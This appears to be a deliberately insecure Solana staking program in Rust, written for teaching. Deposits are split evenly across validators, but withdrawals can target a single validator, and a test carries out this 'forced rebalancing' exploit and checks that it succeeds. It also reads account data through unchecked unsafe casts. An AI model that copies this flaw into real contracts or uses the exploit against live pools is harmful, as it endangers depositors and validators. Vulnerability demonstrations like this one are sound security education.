#![allow(unexpected_cfgs)]
use pinocchio::{
    ProgramResult, account_info::AccountInfo, default_panic_handler, no_allocator,
    program_entrypoint, pubkey::Pubkey,
};

pinocchio_pubkey::declare_id!("ENrRns55VechXJiq4bMbdx7idzQh7tvaEJoYeWxRNe7Y");
// This is the entrypoint for the program.
program_entrypoint!(process_instruction);
//Do not allocate memory.
no_allocator!();
// Use the no_std panic handler.
default_panic_handler!();

/// INSECURE: Asymmetric stake operations allow forced rebalancing attacks
///
/// Vulnerability: Deposit is split evenly across validators, but withdraw
/// allows cherry-picking specific validators. This breaks the stake distribution
/// invariant and allows validators to game the pool.
#[inline(always)]
fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    let (ix_disc, instruction_data) = instruction_data
        .split_first()
        .ok_or(pinocchio::program_error::ProgramError::InvalidInstructionData)?;

    match ix_disc {
        0 => deposit_stake(accounts, instruction_data)?,
        1 => withdraw_stake(accounts, instruction_data)?,
        _ => return Err(pinocchio::program_error::ProgramError::InvalidInstructionData),
    }
    Ok(())
}

///  Evenly distributes stake across all validators
/// Users cannot choose allocation, but this is paired with selective withdrawal
fn deposit_stake(
    accounts: &[AccountInfo],
    data: &[u8],
) -> Result<(), pinocchio::program_error::ProgramError> {
    let validators = accounts;
    let stake = unsafe { *(data[0..8].as_ptr() as *const u64) };

    if validators.is_empty() {
        return Err(pinocchio::program_error::ProgramError::InvalidAccountData);
    }

    // Even distribution: user has no control over allocation
    let per_validator = stake / validators.len() as u64;

    for validator in validators.iter() {
        let validator_data: &mut Validator =
            unsafe { &mut *(validator.borrow_mut_data_unchecked().as_mut_ptr() as *mut Validator) };

        let current = u64::from_le_bytes(validator_data.stake_amount);
        let new = current
            .checked_add(per_validator)
            .ok_or(pinocchio::program_error::ProgramError::InvalidAccountData)?;

        validator_data.stake_amount = new.to_le_bytes();
    }

    Ok(())
}

///  Allows withdrawal from specific validator, breaking distribution invariant
/// Attack: Deposit evenly (all validators up), then withdraw selectively (target down)
fn withdraw_stake(
    accounts: &[AccountInfo],
    data: &[u8],
) -> Result<(), pinocchio::program_error::ProgramError> {
    // User chooses which validator to withdraw from - source of the vulnerability
    let validator_to_withdraw = &accounts[0];
    let stake = unsafe { *(data[0..8].as_ptr() as *const u64) };

    let validator_data: &mut Validator = unsafe {
        &mut *(validator_to_withdraw
            .borrow_mut_data_unchecked()
            .as_mut_ptr() as *mut Validator)
    };

    let current_stake = u64::from_le_bytes(validator_data.stake_amount);
    let new_stake = current_stake
        .checked_sub(stake)
        .ok_or(pinocchio::program_error::ProgramError::InvalidAccountData)?;

    //  No global invariant check, no forced rebalancing
    validator_data.stake_amount = new_stake.to_le_bytes();
    Ok(())
}

#[repr(C)]
struct Validator {
    pub stake_amount: [u8; 8],
}

/// Forced Rebalancing Exploit Test
///
/// Scenario: 3 validators start with 3 stake each (balanced)
/// Attack flow:
/// 1. Deposit 3 → split evenly (A:4, B:4, C:4)
/// 2. Withdraw 3 from A (A:1, B:4, C:4) ← selective withdrawal
/// 3. Deposit 3 → split evenly (A:2, B:5, C:5)
/// 4. Withdraw 3 from B (A:2, B:2, C:5) ← selective withdrawal
/// Result: Validator C has 5, others have 2 (imbalanced)
#[test]
fn test_forced_rebalancing_exploit() {
    use solana_sdk::{
        account::Account,
        instruction::{AccountMeta, Instruction},
        signature::{Keypair, Signer},
        transaction::Transaction,
    };

    const LAMPORTS_PER_SOL: u64 = 1_000_000_000;
    const INITIAL_STAKE: u64 = 3;

    let mut svm = litesvm::LiteSVM::new();
    let (validator_a, validator_b, validator_c) = (Keypair::new(), Keypair::new(), Keypair::new());
    let fee_payer = Keypair::new();

    // Initialize validators with equal stake (3 each)
    for validator in [&validator_a, &validator_b, &validator_c] {
        svm.set_account(
            validator.pubkey(),
            Account {
                lamports: 1_000_000,
                data: INITIAL_STAKE.to_le_bytes().to_vec(),
                owner: crate::ID.into(),
                executable: false,
                rent_epoch: 100,
            },
        )
        .unwrap();
        svm.airdrop(&validator.pubkey(), LAMPORTS_PER_SOL).unwrap();
    }

    svm.airdrop(&fee_payer.pubkey(), LAMPORTS_PER_SOL).unwrap();
    svm.add_program_from_file(
        &crate::ID.into(),
        "../../target/deploy/rebalancing_insecure.so",
    )
    .unwrap();

    // Step 1: Deposit 3 stake (split evenly: +1 to each)
    let deposit_ix = |amount: u64| Instruction {
        program_id: crate::ID.into(),
        accounts: vec![
            AccountMeta::new(validator_a.pubkey(), false),
            AccountMeta::new(validator_b.pubkey(), false),
            AccountMeta::new(validator_c.pubkey(), false),
        ],
        data: {
            let mut d = vec![0u8];
            d.extend_from_slice(&amount.to_le_bytes());
            d
        },
    };

    // Step 2: Withdraw from specific validator (cherry-picking)
    let withdraw_ix = |validator: &Keypair, amount: u64| Instruction {
        program_id: crate::ID.into(),
        accounts: vec![AccountMeta::new(validator.pubkey(), false)],
        data: {
            let mut d = vec![1u8];
            d.extend_from_slice(&amount.to_le_bytes());
            d
        },
    };

    // Exploit sequence: Deposit evenly, withdraw selectively, repeat
    let tx = Transaction::new(
        &[fee_payer.insecure_clone()],
        solana_sdk::message::Message::new(
            &[
                deposit_ix(3),                // A:4, B:4, C:4
                withdraw_ix(&validator_a, 3), // A:1, B:4, C:4 (drain A)
                deposit_ix(3),                // A:2, B:5, C:5
                withdraw_ix(&validator_b, 3), // A:2, B:2, C:5 (drain B)
            ],
            Some(&fee_payer.pubkey()),
        ),
        svm.latest_blockhash(),
    );

    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "Transaction should succeed");

    // ✅ Verify the attack worked: Validator C now dominates
    let get_stake = |key| {
        u64::from_le_bytes(
            svm.get_account(&key).unwrap().data[0..8]
                .try_into()
                .unwrap(),
        )
    };

    let stake_a = get_stake(validator_a.pubkey());
    let stake_b = get_stake(validator_b.pubkey());
    let stake_c = get_stake(validator_c.pubkey());

    println!(
        "Final stakes - A: {}, B: {}, C: {}",
        stake_a, stake_b, stake_c
    );

    //  VULNERABILITY CONFIRMED: Severe imbalance created
    assert_eq!(stake_a, 2, "Validator A should be drained to 2");
    assert_eq!(stake_b, 2, "Validator B should be drained to 2");
    assert_eq!(stake_c, 5, "Validator C should dominate with 5");

    println!("❌ Exploit successful: Imbalance created (C has 2.5x more stake than A/B)");
}
